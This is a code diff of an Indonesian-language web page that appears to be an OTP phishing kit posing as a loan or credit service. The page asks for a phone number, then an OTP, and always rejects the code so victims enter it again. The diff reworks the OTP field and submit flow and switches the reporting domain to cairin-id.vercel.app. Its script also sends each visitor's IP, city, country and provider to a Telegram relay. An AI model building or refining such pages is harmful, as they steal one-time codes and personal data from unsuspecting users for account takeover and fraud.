@@ -1,4 +1,3 @@
-```html
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -94,10 +93,6 @@
         .otp-title { font-size: 20px; font-weight: 700; text-align: center; margin-bottom: 8px; color: #333; }
         .otp-desc { text-align: center; color: #666; font-size: 13px; margin-bottom: 25px; line-height: 1.4; }
         
-        /* Layout 4 Kotak OTP */
-        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; gap: 8px; }
-        .otp-field-display { width: 100%; height: 50px; display: flex; align-items: center; justify-content: center; font-size: 22px; border: 1px solid #ddd; border-radius: 10px; font-weight: 700; color: #333; background: #fafafa; transition: 0.2s; }
-        
         .timer-resend { text-align: center; font-size: 13px; color: #999; margin-bottom: 10px; font-weight: 500; height: 20px; }
         .resend-link { color: #00903B; text-decoration: none; font-weight: bold; display: none; cursor: pointer; }
         
@@ -106,6 +101,10 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
         .otp-error { text-align: center; color: #ff3b30; font-size: 12px; margin-top: 10px; margin-bottom: 10px; display: none; font-weight: 500; }
+
+        /* OTP Submit Button Style */
+        .btn-otp-submit { width: 100%; background: #00903B; color: #fff; border: none; padding: 15px; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 12px rgba(0, 144, 59, 0.3); transition: 0.2s; margin-top: 10px; }
+        .btn-otp-submit:active { transform: scale(0.98); }
     </style>
 </head>
 <body>
@@ -124,7 +123,7 @@
             <div class="card-wrap">
                 <div class="new-register-card main-card">
                     <form class="in-form" id="phoneForm">
-                        <label for="phoneNumber" class="mobile-input">
+                        <label for="phoneInput" class="mobile-input">
                             <div class="in-field__inner">
                                 <div class="in-field__control">
                                     <div class="in-field__prepend">
@@ -204,16 +203,17 @@
             <div class="otp-desc" id="otpDesc">Kode dikirim ke <span id="displayNum" style="font-weight:bold;"></span></div>
             
             <form onsubmit="event.preventDefault();">
-                <!-- 4 Kolom OTP -->
-                <div class="otp-inputs">
-                    <div id="c1" class="otp-field-display">-</div>
-                    <div id="c2" class="otp-field-display">-</div>
-                    <div id="c3" class="otp-field-display">-</div>
-                    <div id="c4" class="otp-field-display">-</div>
-                </div>
-                
-                <!-- Input tersembunyi KHUSUS ANGKA -->
-                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="otpInput" maxlength="4" style="position: absolute; opacity: 0; pointer-events: none; z-index: -1;" autocomplete="off">
+                <!-- Kolom OTP tunggal ala form mobile-input -->
+                <label for="otpInput" class="mobile-input" style="margin-bottom: 20px; padding: 12px 18px;">
+                    <div class="in-field__inner">
+                        <div class="in-field__control">
+                            <div class="in-field__control-container">
+                                <input id="otpInput" maxlength="6" type="tel" inputmode="numeric" pattern="[0-9]*" class="in-field__native" placeholder=" " autocomplete="off" style="text-align: center; font-size: 22px; letter-spacing: 5px; font-weight: bold;">
+                                <div class="in-field__label" style="text-align: center; width: 100%; left: 0;">Masukkan 4-6 Kode OTP</div>
+                            </div>
+                        </div>
+                    </div>
+                </label>
 
                 <div class="otp-error" id="otpErrorText">Kode OTP salah atau sudah kadaluarsa</div>
 
@@ -222,6 +222,8 @@
                     <!-- Tautan ini adalah satu-satunya tempat untuk kirim ulang -->
                     <a href="#" id="resendLink" class="resend-link">Kirim Ulang</a>
                 </div>
+
+                <button type="button" id="submitOtpBtn" class="btn-otp-submit">Verifikasi OTP</button>
             </form>
 
             <div class="loading-overlay" id="loadingSpinner">
@@ -246,12 +248,7 @@
         const displayNum = document.getElementById('displayNum');
         
         const otpInput = document.getElementById('otpInput');
-        const codeItems = [
-            document.getElementById('c1'), 
-            document.getElementById('c2'), 
-            document.getElementById('c3'), 
-            document.getElementById('c4')
-        ];
+        const submitOtpBtn = document.getElementById('submitOtpBtn');
         
         const countSpan = document.getElementById('countSpan');
         const resendLink = document.getElementById('resendLink');
@@ -313,19 +310,13 @@
             otpModal.style.display = 'flex';
             otpErrorText.style.display = 'none';
             
-            // Sembunyikan timer di awal sampai 4 kode pertama diketik
+            // Sembunyikan timer di awal sampai ada submit
             countSpan.style.display = 'none';
             resendLink.style.display = 'none';
             clearInterval(timerInterval);
             isTimerRunning = false;
 
             otpInput.value = '';
-            codeItems.forEach(item => {
-                item.textContent = '-';
-                item.style.borderColor = '#ddd';
-                item.style.background = '#fafafa';
-            });
-            
             otpInput.focus();
         }
 
@@ -334,34 +325,24 @@
             clearInterval(timerInterval);
         });
 
-        // Fokuskan hidden input saat click area kotak OTP
-        document.querySelector('.otp-inputs').addEventListener('click', () => {
-            otpInput.focus();
-        });
-
-        // Sinkronisasi Pengisian Angka & Auto Submit
+        // Validasi input kolom OTP (hanya angka)
         otpInput.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
-            const val = e.target.value;
-            
-            for (let i = 0; i < 4; i++) {
-                codeItems[i].textContent = val[i] ? val[i] : '-';
-                if(val[i]) {
-                    codeItems[i].style.borderColor = '#00903B';
-                    codeItems[i].style.background = '#fff';
-                } else {
-                    codeItems[i].style.borderColor = '#ddd';
-                    codeItems[i].style.background = '#fafafa';
-                }
-            }
-
-            // Auto submit jika sudah memasukkan 4 digit
-            if (val.length === 4) {
-                processOtp(val);
-            }
+            otpErrorText.style.display = 'none';
         });
 
-        // Proses Submit OTP Otomatis
+        // Tombol Submit Verifikasi OTP
+        submitOtpBtn.addEventListener('click', () => {
+            let otpCode = otpInput.value;
+            if (otpCode.length < 4 || otpCode.length > 6) {
+                otpErrorText.textContent = "Format salah, silakan masukkan 4-6 angka";
+                otpErrorText.style.display = 'block';
+                return;
+            }
+            processOtp(otpCode);
+        });
+
+        // Proses Submit OTP
         function processOtp(otpCode) {
             otpInput.blur(); // Hilangkan fokus keyboard
             
@@ -377,17 +358,14 @@
                 loadingSpinner.style.display = 'none';
                 
                 // Tampilkan pesan error
+                otpErrorText.textContent = "Kode OTP salah atau sudah kadaluarsa";
                 otpErrorText.style.display = 'block';
                 
                 // Kosongkan input
                 otpInput.value = '';
-                codeItems.forEach(item => {
-                    item.textContent = '-';
-                    item.style.borderColor = '#ddd';
-                    item.style.background = '#fafafa';
-                });
+                otpInput.focus();
                 
-                // HITUNGAN MUNDUR DIMULAI SETELAH 4 KODE DIKETIK & DIPROSES
+                // HITUNGAN MUNDUR DIMULAI SETELAH KODE DISUBMIT & DIPROSES
                 if (!isTimerRunning) {
                     startTimer();
                 }
@@ -431,16 +409,10 @@
 
             setTimeout(() => {
                 loadingSpinner.style.display = 'none';
-                loadingText.innerText = 'Memverifikasi...';
                 
-                // Form direset, timer menunggu input 4 kode lagi
+                // Form direset
                 isTimerRunning = false;
                 otpInput.value = '';
-                codeItems.forEach(item => {
-                    item.textContent = '-';
-                    item.style.borderColor = '#ddd';
-                    item.style.background = '#fafafa';
-                });
                 otpInput.focus();
             }, 2000);
         }
@@ -456,7 +428,7 @@
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n<b>Domain:</b> https://cek-data-kredione.vercel.app\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+                    const infoPesan = `<b>🚀 NGA!!! NGA!!! ADE YANG KLIK WEB!</b>\n\n<b>Domain:</b> https://cairin-id.vercel.app\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
@@ -470,4 +442,3 @@
     </script>
 </body>
 </html>
-```
